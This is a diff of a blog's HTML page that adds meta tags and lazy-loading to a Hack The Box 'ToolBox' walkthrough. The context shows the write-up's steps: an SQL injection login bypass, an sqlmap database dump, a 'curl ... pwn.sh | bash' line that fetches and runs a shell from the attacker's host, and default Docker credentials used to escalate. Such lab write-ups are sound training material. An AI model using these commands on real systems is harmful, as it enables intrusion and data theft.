@@ -3,6 +3,18 @@
 <head>
     <meta charset="utf-8">
     <title>HTB: ToolBox | HackWithJordan</title>
+    <!-- site-meta -->
+    <meta name="description" content="Walkthrough of the Hack The Box machine ToolBox, from first foothold to full compromise.">
+    <link rel="canonical" href="https://hackwithjordan.com/posts/2024-06-03-ToolBox(HTB).html">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="HackWithJordan">
+    <meta property="og:title" content="HTB: ToolBox">
+    <meta property="og:description" content="Walkthrough of the Hack The Box machine ToolBox, from first foothold to full compromise.">
+    <meta property="og:url" content="https://hackwithjordan.com/posts/2024-06-03-ToolBox(HTB).html">
+    <meta property="og:image" content="https://hackwithjordan.com/assets/room/poster.jpg">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta property="article:published_time" content="2024-06-03">
+    <!-- /site-meta -->
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" href="../assets/css/syntax.css">
     <style>
@@ -310,9 +322,9 @@
 
         <p>Adding admin.megalogistic.com gives us a login page</p>
 
-        <img alt="Screenshot 2" height="1356" src="../img/posts/2024-06-03-ToolBox(HTB)/02-4fb83800c7.png" style="aspect-ratio:2533/1356;" width="2533"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 2" height="1356" src="../img/posts/2024-06-03-ToolBox(HTB)/02-4fb83800c7.png" style="aspect-ratio:2533/1356;" width="2533"/>
 
-        <img alt="Screenshot 3" height="200" src="../img/posts/2024-06-03-ToolBox(HTB)/03-11e7bd66ee.png" style="aspect-ratio:1086/200;" width="1086"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 3" height="200" src="../img/posts/2024-06-03-ToolBox(HTB)/03-11e7bd66ee.png" style="aspect-ratio:1086/200;" width="1086"/>
 
         <p>smb 445 - anonymous login not allowed</p>
 
@@ -324,41 +336,41 @@
 
         <p>Brandon Sharp<br/>Christine Rooster<br/>Connor Hodson</p>
 
-        <img alt="Screenshot 4" height="509" src="../img/posts/2024-06-03-ToolBox(HTB)/04-2dfd7386cb.png" style="aspect-ratio:1191/509;" width="1191"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 4" height="509" src="../img/posts/2024-06-03-ToolBox(HTB)/04-2dfd7386cb.png" style="aspect-ratio:1191/509;" width="1191"/>
 
         <p>Nothing else interesting so I mounted the ftp share so I can run strings on the big exe file.</p>
 
-        <img alt="Screenshot 5" height="184" src="../img/posts/2024-06-03-ToolBox(HTB)/05-a57ea6432a.png" style="aspect-ratio:532/184;" width="532"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 5" height="184" src="../img/posts/2024-06-03-ToolBox(HTB)/05-a57ea6432a.png" style="aspect-ratio:532/184;" width="532"/>
 
         <p>I transferred the docker file to my windows machine and its just a normal docker toolbox so there will be nothing interesting here. It does have a version number which could be helpful. Looks like there's no obvious vulnerabilities though.</p>
 
-        <img alt="Screenshot 6" height="541" src="../img/posts/2024-06-03-ToolBox(HTB)/06-e295cca32a.png" style="aspect-ratio:405/541;" width="405"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 6" height="541" src="../img/posts/2024-06-03-ToolBox(HTB)/06-e295cca32a.png" style="aspect-ratio:405/541;" width="405"/>
 
         <p>At this point I was stuck and looked back at the nmap scan, ssh is running OpenSSH for_Windows_7.7 and windows 7 is pretty outdated and I googled it and theres some known exploits for username enumeration but I couldnt find anything useful.</p>
 
         <p>Login page has SQL injection that I missed.</p>
 
-        <img alt="Screenshot 7" height="360" src="../img/posts/2024-06-03-ToolBox(HTB)/07-7d07c2ead8.png" style="aspect-ratio:2321/360;" width="2321"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 7" height="360" src="../img/posts/2024-06-03-ToolBox(HTB)/07-7d07c2ead8.png" style="aspect-ratio:2321/360;" width="2321"/>
 
         <p>We can sign in with this sql injection</p>
 
         <p>admin'OR'1'='1'--</p>
 
-        <img alt="Screenshot 8" height="1243" src="../img/posts/2024-06-03-ToolBox(HTB)/08-d75ecfd963.png" style="aspect-ratio:2235/1243;" width="2235"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 8" height="1243" src="../img/posts/2024-06-03-ToolBox(HTB)/08-d75ecfd963.png" style="aspect-ratio:2235/1243;" width="2235"/>
 
         <p>Dump the database with sqlmap. In order for this to work I had to change my burp request as it was getting connection refused.</p>
 
         <p>I changed the host to include https:// before hand it was just admin.megalogistic.com. Changing it allowed sqlmap to work as expected.</p>
 
-        <img alt="Screenshot 9" height="407" src="../img/posts/2024-06-03-ToolBox(HTB)/09-9101eb217f.png" style="aspect-ratio:942/407;" width="942"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 9" height="407" src="../img/posts/2024-06-03-ToolBox(HTB)/09-9101eb217f.png" style="aspect-ratio:942/407;" width="942"/>
 
         <pre class="terminal"><code>sqlmap -r request.txt --dump --batch</code></pre>
 
-        <img alt="Screenshot 10" height="383" src="../img/posts/2024-06-03-ToolBox(HTB)/10-cfc5ee1e7e.png" style="aspect-ratio:1117/383;" width="1117"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 10" height="383" src="../img/posts/2024-06-03-ToolBox(HTB)/10-cfc5ee1e7e.png" style="aspect-ratio:1117/383;" width="1117"/>
 
         <p>admin hash 4a100a85cb5ca3616dcf137918550815</p>
 
-        <img alt="Screenshot 11" height="92" src="../img/posts/2024-06-03-ToolBox(HTB)/11-878e56540a.png" style="aspect-ratio:419/92;" width="419"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 11" height="92" src="../img/posts/2024-06-03-ToolBox(HTB)/11-878e56540a.png" style="aspect-ratio:419/92;" width="419"/>
 
         <p>couldnt get john or hashcat to crack it but this website has the hash in the database</p>
 
@@ -370,29 +382,29 @@
 
         <p>Used guided mode for a hint, we can use os-shell to execute system commands. This is a windows machine with docker running linux. Which I should have realized from the sql error stating index.php was located in /var/www/admin</p>
 
-        <img alt="Screenshot 12" height="441" src="../img/posts/2024-06-03-ToolBox(HTB)/12-d8a94d8399.png" style="aspect-ratio:945/441;" width="945"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 12" height="441" src="../img/posts/2024-06-03-ToolBox(HTB)/12-d8a94d8399.png" style="aspect-ratio:945/441;" width="945"/>
 
         <p>We can get a shell with curl</p>
 
         <pre class="terminal"><code>curl http://10.10.14.32:8000/pwn.sh | bash</code></pre>
 
-        <img alt="Screenshot 13" height="197" src="../img/posts/2024-06-03-ToolBox(HTB)/13-7c8441703a.png" style="aspect-ratio:686/197;" width="686"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 13" height="197" src="../img/posts/2024-06-03-ToolBox(HTB)/13-7c8441703a.png" style="aspect-ratio:686/197;" width="686"/>
 
         <p>There is a user but his directory is empty. Running linpeas finds us the user flag located at /var/lib/postgresql/user.txt.</p>
 
-        <img alt="Screenshot 14" height="635" src="../img/posts/2024-06-03-ToolBox(HTB)/14-a6cfd41a37.png" style="aspect-ratio:1034/635;" width="1034"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 14" height="635" src="../img/posts/2024-06-03-ToolBox(HTB)/14-a6cfd41a37.png" style="aspect-ratio:1034/635;" width="1034"/>
 
         <p>I accidentally saw a write up on this when looking for priv esc. Some guy made a post show casing a “priv esc” but its just a guide on this machine sadly.</p>
 
         <p>The priv esc is seeing the docker IP above and SSH in with default docker creds. <strong>username for the boot2docker default user is docker and the password is tcuser</strong></p>
 
-        <img alt="Screenshot 15" height="319" src="../img/posts/2024-06-03-ToolBox(HTB)/15-effeb06040.png" style="aspect-ratio:968/319;" width="968"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 15" height="319" src="../img/posts/2024-06-03-ToolBox(HTB)/15-effeb06040.png" style="aspect-ratio:968/319;" width="968"/>
 
         <p>I wouldnt have figured this out as ive never seen this before so i guess its a good thing I happened to stumble across the way.</p>
 
         <p>We cd to c which has a clone of the windows machine containing the admin user and the root.txt file. Really lame priv esc but I learned something new.</p>
 
-        <img alt="Screenshot 16" height="182" src="../img/posts/2024-06-03-ToolBox(HTB)/16-ae2616210c.png" style="aspect-ratio:401/182;" width="401"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 16" height="182" src="../img/posts/2024-06-03-ToolBox(HTB)/16-ae2616210c.png" style="aspect-ratio:401/182;" width="401"/>
     </article>
 
 <script>
